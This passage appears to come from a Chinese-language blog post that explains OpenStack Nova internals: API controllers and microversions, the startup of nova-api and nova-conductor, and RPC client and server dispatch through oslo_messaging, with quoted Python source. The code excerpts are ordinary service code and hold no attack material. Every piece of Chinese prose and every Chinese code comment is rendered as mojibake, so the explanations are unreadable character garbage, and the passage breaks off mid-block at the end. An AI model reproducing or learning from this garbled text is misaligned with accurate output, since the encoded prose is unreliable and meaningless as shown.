ç›®å½•åŒ…å«æ¯ä¸ª API å¯¹åº”çš„ Controller å®ç°ï¼ŒResource å¯¹è±¡å°†è¯·æ±‚çš„ API æ˜ å°„åˆ°ç›¸åº”çš„ Controller æ–¹æ³•ä¸Šã€‚</p><p>ä»¥ keypairs.py ï¼ˆå¯†é’¥å¯¹ç®¡ç†æ‰©å±•ï¼‰ä¸ºä¾‹ï¼Œå…¬å…±æ–¹æ³•åŒ…å« createã€deleteã€showã€indexï¼Œå¤šä¸ªå®ç°å¯¹åº”ä¸åŒçš„ Microversionï¼ˆä½¿ç”¨ <code>@wsgi.Controller.api_version</code> è£…é¥°å™¨ï¼‰</p><ul><li><code>@wsgi.expected_errors</code>ï¼šAPI å…è®¸çš„é”™è¯¯è¿”å›ç </li><li><code>@validation.query_schema</code>ï¼šè¯·æ±‚å¯¹åº”çš„ json schema</li><li><code>@wsgi.response</code>ï¼šAPI è¯·æ±‚æ­£å¸¸è¿”å›ç </li><li><code>@wsgi.action</code>ï¼šæ³¨å†Œ action</li></ul><p>Microversion ç”¨äºå®ç°å…¼å®¹æ€§ã€‚</p><p>nova/api/openstack/compute/schemas åŒ…å«å…è®¸çš„ json schemaï¼Œè¡¨ç¤ºæ¥å—çš„é”®å€¼å¯¹åŠå…¶ç±»å‹ã€‚</p><p>é€šè¿‡æ–¹æ³•æ¥å£å¯ä»¥å¾—åˆ° webob.Request å¯¹è±¡ï¼Œä» Request å¯¹è±¡ä¸­å¯ä»¥è·å–å…¶ä»–è¯·æ±‚å‚æ•°ï¼Œç”¨äºæ‰§è¡Œå¯¹åº”çš„æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KeypairController</span>(<span class="params">wsgi.Controller</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Keypair API controller for the OpenStack API.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    _view_builder_class = keypairs_view.ViewBuilder</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(KeypairController, self).__init__()</span><br><span class="line">        self.api = compute_api.KeypairAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wsgi.Controller.api_version(<span class="params"><span class="string">&quot;2.10&quot;</span></span>)</span></span><br><span class="line"><span class="meta">    @wsgi.response(<span class="params"><span class="number">201</span></span>)</span></span><br><span class="line"><span class="meta">    @wsgi.expected_errors(<span class="params">(<span class="params"><span class="number">400</span>, <span class="number">403</span>, <span class="number">409</span></span>)</span>)</span></span><br><span class="line"><span class="meta">    @validation.schema(<span class="params">keypairs.create_v210</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">self, req, body</span>):</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wsgi.Controller.api_version(<span class="params"><span class="string">&quot;2.2&quot;</span>, <span class="string">&quot;2.9&quot;</span></span>)  </span><span class="comment"># noqa</span></span><br><span class="line"><span class="meta">    @wsgi.response(<span class="params"><span class="number">201</span></span>)</span></span><br><span class="line"><span class="meta">    @wsgi.expected_errors(<span class="params">(<span class="params"><span class="number">400</span>, <span class="number">403</span>, <span class="number">409</span></span>)</span>)</span></span><br><span class="line"><span class="meta">    @validation.schema(<span class="params">keypairs.create_v22</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">self, req, body</span>):</span>  <span class="comment"># noqa</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><h2 id="nova-conductor"><a href="#nova-conductor" class="headerlink" title="nova-conductor"></a>nova-conductor</h2><p>ä½¿ç”¨ RPC çš„å­ç»„ä»¶é€šå¸¸åŒ…å«ä»¥ä¸‹æ–‡ä»¶ï¼š</p><ul><li>api.py å¯¹ RPC æ¥å£è¿›è¡Œå°è£…ï¼Œç±»ä¼¼æä¾› SDK</li><li>rpcapi.py æš´éœ²ç»™å…¶ä»–å†…éƒ¨ç»„ä»¶çš„ RPC æ¥å£ï¼ŒRPC å®¢æˆ·ç«¯</li><li>manager.py å¤„ç† RPC API è°ƒç”¨</li></ul><p>nova-compute è®¿é—®æ•°æ®åº“çš„æ“ä½œéƒ½è¦ç”± nova-conductor ä»£ç†ï¼Œç”¨ nova/conductor/manager.py çš„ ConductorManager ç±»å®Œæˆï¼Œå‡ºäºå®‰å…¨æ€§è€ƒè™‘ï¼Œnova-conductor å’Œ nova-compute ä¸èƒ½éƒ¨ç½²åœ¨åŒä¸€æœåŠ¡å™¨ä¸Šã€‚</p><p>nova/objects å®šä¹‰äº† nova objectï¼Œå°è£…æ•°æ®åº“ CURD æ“ä½œï¼Œæ¯ä¸ªç±»å¯¹åº”æ•°æ®åº“ä¸­çš„ä¸€å¼ è¡¨ã€‚</p><h2 id="nova-scheduler"><a href="#nova-scheduler" class="headerlink" title="nova-scheduler"></a>nova-scheduler</h2><p>nova-scheduler æ‰§è¡Œè°ƒåº¦å†³ç­–ï¼Œnova-compute æ”¶é›†å¹¶æ›´æ–°ä¸»æœºæ•°æ®ï¼Œå®æ—¶å†™å…¥æ•°æ®åº“ï¼ˆå‘¨æœŸä»»åŠ¡ï¼‰ã€‚</p><p>nova/scheduler/filters åŒ…å«æ‰€æœ‰çš„è¿‡æ»¤å™¨å®ç°ï¼Œç”¨äºè¿‡æ»¤ä¸ç¬¦åˆæ¡ä»¶çš„ä¸»æœºï¼›nova/scheduler/weights åŒ…å«æ‰€æœ‰çš„æƒé‡å®ç°ï¼Œç”¨äºè®¡ç®—æƒé‡å¹¶æ’åºã€‚</p><h1 id="å¯åŠ¨æµç¨‹"><a href="#å¯åŠ¨æµç¨‹" class="headerlink" title="å¯åŠ¨æµç¨‹"></a>å¯åŠ¨æµç¨‹</h1><p><strong>nova-api</strong> å¯åŠ¨å…¥å£ <code>nova.cmd.api:main</code></p><ul><li><a href="https://docs.openstack.org/nova/queens/reference/gmr.html">Guru Meditation Reports</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    config.parse_args(sys.argv) <span class="comment"># è§£æå‚æ•°</span></span><br><span class="line">    logging.setup(CONF, <span class="string">&quot;nova&quot;</span>) <span class="comment"># è®¾ç½®æ—¥å¿—</span></span><br><span class="line">    objects.register_all()      <span class="comment"># æ³¨å†Œ nova object</span></span><br><span class="line">    gmr_opts.set_defaults(CONF) <span class="comment"># è®¾ç½® oslo_reports</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;osapi_compute&#x27;</span> <span class="keyword">in</span> CONF.enabled_apis:</span><br><span class="line">        <span class="comment"># NOTE(mriedem): This is needed for caching the nova-compute service</span></span><br><span class="line">        <span class="comment"># version.</span></span><br><span class="line">        objects.Service.enable_min_version_cache()</span><br><span class="line">    log = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”ŸæˆæŠ¥å‘Šçš„æœºåˆ¶ Guru Meditation Report (GMR)</span></span><br><span class="line">    gmr.TextGuruMeditation.setup_autorun(version, conf=CONF)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># oslo_service.ProcessLauncher</span></span><br><span class="line">    launcher = service.process_launcher()</span><br><span class="line">    started = <span class="number">0</span></span><br><span class="line">    <span class="comment"># æ ¹æ® paste-ini æ–‡ä»¶åˆ›å»º WSGI åº”ç”¨</span></span><br><span class="line">    <span class="keyword">for</span> api <span class="keyword">in</span> CONF.enabled_apis:</span><br><span class="line">        should_use_ssl = api <span class="keyword">in</span> CONF.enabled_ssl_apis</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># nova.service.WSGIService åˆå§‹åŒ– WSGI ç¨‹åº</span></span><br><span class="line">            server = service.WSGIService(api, use_ssl=should_use_ssl)</span><br><span class="line">            <span class="comment"># oslo_service.ProcessLauncher åˆ›å»ºå­è¿›ç¨‹å¯åŠ¨æœåŠ¡</span></span><br><span class="line">            launcher.launch_service(server, workers=server.workers <span class="keyword">or</span> <span class="number">1</span>)</span><br><span class="line">            started += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> exception.PasteAppNotFound <span class="keyword">as</span> ex:</span><br><span class="line">            log.warning(<span class="string">&quot;%s. ``enabled_apis`` includes bad values. &quot;</span></span><br><span class="line">                        <span class="string">&quot;Fix to remove this warning.&quot;</span>, ex)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> started == <span class="number">0</span>:</span><br><span class="line">        log.error(<span class="string">&#x27;No APIs were started. &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;Check the enabled_apis config option.&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢</span></span><br><span class="line">    launcher.wait()</span><br></pre></td></tr></table></figure><p>nova.service.WSGIService çš„åˆå§‹åŒ–å‡½æ•°å®ä¾‹åŒ– nova.wsgi.Server ï¼Œå¯åŠ¨å‡½æ•°å®é™…è°ƒç”¨äº† nova.wsgi.Server çš„ start æ–¹æ³•ã€‚</p><p>å…¶ä¸­çš„ self._socket ä½¿ç”¨ <code>eventlet.listen</code> åˆ›å»ºï¼Œæœ€åä½¿ç”¨ utils ä¸­å°è£…çš„ spawn å‡½æ•°å¯åŠ¨ WSGI ç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>(<span class="params">service.ServiceBase</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Server class to manage a WSGI server, serving a WSGI application.&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Start serving a WSGI application.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :returns: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># The server socket object will be closed after server exits,</span></span><br><span class="line">        <span class="comment"># but the underlying file descriptor will remain open, and will</span></span><br><span class="line">        <span class="comment"># give bad file descriptor error. So duplicating the socket object,</span></span><br><span class="line">        <span class="comment"># to keep file descriptor usable.</span></span><br><span class="line"></span><br><span class="line">        dup_socket = self._socket.dup()</span><br><span class="line">        dup_socket.setsockopt(socket.SOL_SOCKET,</span><br><span class="line">                              socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># sockets can hang around forever without keepalive</span></span><br><span class="line">        dup_socket.setsockopt(socket.SOL_SOCKET,</span><br><span class="line">                              socket.SO_KEEPALIVE, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        self._server = utils.spawn(**wsgi_kwargs)</span><br></pre></td></tr></table></figure><p><strong>nova-conductor</strong> å¯åŠ¨å…¥å£ <code>nova.cmd.conductor:main</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    config.parse_args(sys.argv)</span><br><span class="line">    logging.setup(CONF, <span class="string">&quot;nova&quot;</span>)</span><br><span class="line">    objects.register_all()</span><br><span class="line">    gmr_opts.set_defaults(CONF)</span><br><span class="line">    objects.Service.enable_min_version_cache()</span><br><span class="line"></span><br><span class="line">    gmr.TextGuruMeditation.setup_autorun(version, conf=CONF)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># nova.service.Service å®ä¾‹åŒ– Service å¯¹è±¡</span></span><br><span class="line">    server = service.Service.create(binary=<span class="string">&#x27;nova-conductor&#x27;</span>,</span><br><span class="line">                                    topic=rpcapi.RPC_TOPIC)</span><br><span class="line">    workers = CONF.conductor.workers <span class="keyword">or</span> processutils.get_worker_count()</span><br><span class="line">    <span class="comment"># oslo_service.launch åˆ›å»º launcher</span></span><br><span class="line">    service.serve(server, workers=workers)</span><br><span class="line">    <span class="comment"># è°ƒç”¨ launcher.wait ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢</span></span><br><span class="line">    service.wait()</span><br></pre></td></tr></table></figure><p>nova.service.Service åˆå§‹åŒ–å‡½æ•°æ¥å— manager å¯¹è±¡ï¼Œé€šè¿‡ç›‘å¬æ¶ˆæ¯é˜Ÿåˆ—å¯ç”¨ RPC æœåŠ¡ï¼›è®¾ç½®å®šæœŸä»»åŠ¡æŠ¥å‘ŠçŠ¶æ€ï¼Œå¹¶å†™å…¥æ•°æ®åº“ã€‚</p><ul><li>nova-compute</li><li>nova-conductor</li><li>nova-scheduler</li></ul><p>RPC æœåŠ¡å¯åŠ¨æ—¶åˆ›å»º rpc_client ç”¨äºå‘é€æ¶ˆæ¯ï¼Œåˆ›å»º rpc_server ç”¨äºæ¥æ”¶æ¶ˆæ¯ï¼Œåˆ†æ´¾æ‰§è¡Œã€‚</p><p><strong>1. rpc_client</strong></p><p>nova/cmd/conductor.py å®é™…åˆ›å»º Service å®ä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server = service.Service.create(binary=<span class="string">&#x27;nova-conductor&#x27;</span>,</span><br><span class="line">                                topic=rpcapi.RPC_TOPIC)</span><br></pre></td></tr></table></figure><p>nova/service.py åˆå§‹åŒ–å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»º _driver</span></span><br><span class="line">self.servicegroup_api = servicegroup.API()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ¨æ€å¯¼å…¥ manager ç±»</span></span><br><span class="line">manager_class = importutils.import_class(self.manager_class_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> objects_base.NovaObject.indirection_api:</span><br><span class="line">    <span class="comment"># åˆ›å»º RPCClient</span></span><br><span class="line">    conductor_api = conductor.API()</span><br><span class="line">    <span class="comment"># ç­‰å¾… nova-conductor å¯åŠ¨</span></span><br><span class="line">    conductor_api.wait_until_ready(context.get_admin_context())</span><br></pre></td></tr></table></figure><p>nova/servicegroup/api.py åˆ›å»º _driver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driver_class = _driver_name_class_mapping[CONF.servicegroup_driver]</span><br><span class="line">self._driver = importutils.import_object(driver_class,</span><br><span class="line">                                         *args, **kwargs)</span><br></pre></td></tr></table></figure><p>nova/conductor/api.py å®é™…è°ƒç”¨ rpcapi.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.conductor_rpcapi = rpcapi.ConductorAPI()</span><br><span class="line">    self.base_rpcapi = baserpc.BaseAPI(topic=rpcapi.RPC_TOPIC)</span><br></pre></td></tr></table></figure><p>nova/conductor/rpcapi.py è®¾ç½® rpc_client</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="built_in">super</span>(ConductorAPI, self).__init__()</span><br><span class="line">    target = messaging.Target(topic=RPC_TOPIC, version=<span class="string">&#x27;3.0&#x27;</span>)</span><br><span class="line">    version_cap = self.VERSION_ALIASES.get(CONF.upgrade_levels.conductor,</span><br><span class="line">                                           CONF.upgrade_levels.conductor)</span><br><span class="line">    serializer = objects_base.NovaObjectSerializer()</span><br><span class="line">    <span class="comment"># rpc client</span></span><br><span class="line">    self.client = rpc.get_client(target,</span><br><span class="line">                                 version_cap=version_cap,</span><br><span class="line">                                 serializer=serializer)</span><br></pre></td></tr></table></figure><p>nova/baserpc.py è®¾ç½® rpc_client</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, topic</span>):</span></span><br><span class="line">    <span class="built_in">super</span>(BaseAPI, self).__init__()</span><br><span class="line">    target = messaging.Target(topic=topic,</span><br><span class="line">                              namespace=_NAMESPACE,</span><br><span class="line">                              version=<span class="string">&#x27;1.0&#x27;</span>)</span><br><span class="line">    version_cap = self.VERSION_ALIASES.get(CONF.upgrade_levels.baseapi,</span><br><span class="line">                                           CONF.upgrade_levels.baseapi)</span><br><span class="line">    self.client = rpc.get_client(target, version_cap=version_cap)</span><br></pre></td></tr></table></figure><p><strong>2. rpc_server</strong></p><p>nova/cmd/conductor.py ä½¿ç”¨ Service å®ä¾‹å¯åŠ¨æœåŠ¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># oslo_service.launch åˆ›å»º launcher</span></span><br><span class="line">service.serve(server, workers=workers)</span><br><span class="line"><span class="comment"># è°ƒç”¨ launcher.wait ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢</span></span><br><span class="line">service.wait()</span><br></pre></td></tr></table></figure><p>nova/service.py å®é™…è°ƒç”¨ <a href="https://github.com/openstack/oslo.service">oslo_service</a> çš„ launch å‡½æ•°ï¼Œåˆ›å»ºç»¿è‰²çº¿ç¨‹ï¼ˆgreenthreadï¼‰æˆ–è¿›ç¨‹ï¼Œæœ€ç»ˆè°ƒç”¨ Service å®ä¾‹çš„ start æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve</span>(<span class="params">server, workers=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> _launcher</span><br><span class="line">    <span class="keyword">if</span> _launcher:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(_(<span class="string">&#x27;serve() can only be called once&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    _launcher = service.launch(CONF, server, workers=workers,</span><br><span class="line">                               restart_method=<span class="string">&#x27;mutate&#x27;</span>)</span><br></pre></td></tr></table></figure><p>nova/service.py Service å®ä¾‹çš„ start æ–¹æ³•åˆ›å»º rpc_server å’Œ dispatcherï¼›è®¾ç½®å‘¨æœŸä»»åŠ¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»º rpc server ä»¥åŠ dispatcher</span></span><br><span class="line">self.rpcserver = rpc.get_server(target, endpoints, serializer)</span><br><span class="line">self.rpcserver.start()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.periodic_enable:</span><br><span class="line">    <span class="keyword">if</span> self.periodic_fuzzy_delay:</span><br><span class="line">        initial_delay = random.randint(<span class="number">0</span>, self.periodic_fuzzy_delay)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        initial_delay = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    self.tg.add_dynamic_timer(self.periodic_tasks,</span><br><span class="line">                             initial_delay=initial_delay,</span><br><span class="line">                             periodic_interval_max=</span><br><span class="line">                                self.periodic_interval_max)</span><br></pre></td></tr></table></figure><p>æ”¶åˆ°æ¶ˆæ¯åä¸»è¦ç”± <a href="https://github.com/openstack/oslo.messaging">oslo_messaging</a> è¿›è¡Œè§£æå’Œå¤„ç†ï¼Œæ ¸å¿ƒæ˜¯ oslo_messaging/rpc/dispatcher.py</p><p>incoming æ˜¯ AMQP æ¶ˆæ¯æ ¼å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch</span>(<span class="params">self, incoming</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Dispatch an RPC message to the appropriate endpoint method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param incoming: incoming message</span></span><br><span class="line"><span class="string">    :type incoming: IncomingMessage</span></span><br><span class="line"><span class="string">    :raises: NoSuchMethod, UnsupportedVersion</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    message = incoming.message</span><br><span class="line">    ctxt = incoming.ctxt</span><br><span class="line"></span><br><span class="line">    method = message.get(<span class="string">&#x27;method&#x27;</span>)</span><br><span class="line">    args = message.get(<span class="string">&#x27;args&#x27;</span>, &#123;&#125;)</span><br><span class="line">    namespace = message.get(<span class="string">&#x27;namespace&#x27;</span>)</span><br><span class="line">    version = message.get(<span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;1.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): This event and watchdog thread are used to send</span></span><br><span class="line">    <span class="comment"># call-monitoring heartbeats for this message while the call</span></span><br><span class="line">    <span class="comment"># is executing if it runs for some time. The thread will wait</span></span><br><span class="line">    <span class="comment"># for the event to be signaled, which we do explicitly below</span></span><br><span class="line">    <span class="comment"># after dispatching the method call.</span></span><br><span class="line">    completion_event = eventletutils.Event()</span><br><span class="line">    watchdog_thread = threading.Thread(target=self._watchdog,</span><br><span class="line">                                       args=(completion_event, incoming))</span><br><span class="line">    <span class="keyword">if</span> incoming.client_timeout:</span><br><span class="line">        <span class="comment"># NOTE(danms): The client provided a timeout, so we start</span></span><br><span class="line">        <span class="comment"># the watchdog thread. If the client is old or didn&#x27;t send</span></span><br><span class="line">        <span class="comment"># a timeout, we just never start the watchdog thread.</span></span><br><span class="line">        watchdog_thread.start()</span><br><span class="line"></span><br><span class="line">    found_compatible = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> endpoint <span class="keyword">in</span> self.endpoints:</span><br><span class="line">        target = <span class="built_in">getattr</span>(endpoint, <span class="string">&#x27;target&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target:</span><br><span class="line">            target = self._default_target</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (self._is_namespace(target, namespace) <span class="keyword">and</span></span><br><span class="line">                self._is_compatible(target, version)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(endpoint, method):</span><br><span class="line">            <span class="keyword">if</span> self.access_policy.is_allowed(endpoint, method):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># åˆ†æ´¾ï¼Œè°ƒç”¨å‡½æ•°</span></span><br><span class="line">                    <span class="keyword">return</span> self._do_dispatch(endpoint, method, ctxt, args)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    completion_event.<span class="built_in">set</span>()</span><br><span class="line">                    <span class="keyword">if</span> incoming.client_timeout:</span><br><span class="line">                        watchdog_thread.join()</span><br><span class="line"></span><br><span class="line">        found_compatible = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> found_compatible:</span><br><span class="line">        <span class="keyword">raise</span> NoSuchMethod(method)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> UnsupportedVersion(version, method=method)</span><br></pre></td></tr></table></figure><p>oslo_messaging/rpc/dispatcher.py è°ƒç”¨å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_do_dispatch</span>(<span class="params">self, endpoint, method, ctxt, args</span>):</span></span><br><span class="line">    ctxt = self.serializer.deserialize_context(ctxt)</span><br><span class="line">    new_args = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> argname, arg <span class="keyword">in</span> args.items():</span><br><span class="line">        new_args[argname] = self.serializer.deserialize_entity(ctxt, arg)</span><br><span class="line">    func = <span class="built_in">getattr</span>(endpoint, method)</span><br><span class="line">    result = func(ctxt, **new_args)</span><br><span class="line">    <span class="keyword">return</span> self.serializer.serialize_entity(ctxt, result)</span><br></pre></td></tr></table></figure><p>å‘é€æ¶ˆæ¯çš„å®ç°éƒ½åœ¨ nova/conductor/rpcapi.py ä¸­ï¼Œcctxt.call åŒæ­¥è°ƒç”¨ï¼Œcctxt.cast å¼‚æ­¥è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 